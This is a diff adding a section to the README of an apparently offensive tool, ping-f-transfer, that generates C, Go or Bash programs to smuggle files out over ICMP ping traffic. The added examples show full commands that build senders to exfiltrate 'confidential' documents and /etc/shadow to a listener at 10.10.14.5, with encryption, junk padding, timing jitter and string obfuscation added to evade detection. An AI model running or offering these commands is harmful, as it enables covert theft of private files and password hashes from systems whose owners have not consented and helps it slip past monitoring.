@@ -370,3 +370,54 @@ gcc -o sender sender.c -static -lm -lz
 # Windows with compression (requires libz-mingw-w64-dev)
 x86_64-w64-mingw32-gcc -o sender.exe sender.c -static -lws2_32 -liphlpapi -lm -lz
 ```
+
+---
+
+## All flags combined
+
+Using every available flag in a single `makefile` command (C for Windows as an example):
+
+```bash
+ping-f-transfer makefile -f 'C:\Users\admin\Desktop\confidential.docx' -i 10.10.14.5 -l c \
+  --create-script-for windows \
+  -p 0.01 -r 0.003 \
+  --junk 2 --randomize-junk \
+  --compress \
+  --encrypt aes-128 --random-passphrase 32 \
+  --randomize-var --obfuscate-strings \
+  -o /tmp/sender.c \
+  --capture-packets-filename capture_all.hex \
+  --decoded-filename recovered.docx \
+  --no-banner
+```
+
+The same pattern works with any language. Here it is with Go for Linux:
+
+```bash
+ping-f-transfer makefile -f '/home/user/confidential.pdf' -i 10.10.14.5 -l go \
+  --create-script-for linux \
+  -p 0.01 -r 0.003 \
+  --junk 2 --randomize-junk \
+  --compress \
+  --encrypt aes-128 --random-passphrase 32 \
+  --randomize-var --obfuscate-strings \
+  -o /tmp/sender.go \
+  --capture-packets-filename capture_all.hex \
+  --decoded-filename recovered.pdf \
+  --no-banner
+```
+
+And with a scripting language (Bash):
+
+```bash
+ping-f-transfer makefile -f '/etc/shadow' -i 10.10.14.5 -l bash \
+  -p 0.01 -r 0.003 \
+  --junk 2 --randomize-junk \
+  --compress \
+  --encrypt aes-128 --random-passphrase 32 \
+  --randomize-var --obfuscate-strings \
+  -o /tmp/sender.sh \
+  --capture-packets-filename capture_all.hex \
+  --decoded-filename recovered_shadow.txt \
+  --no-banner
+```
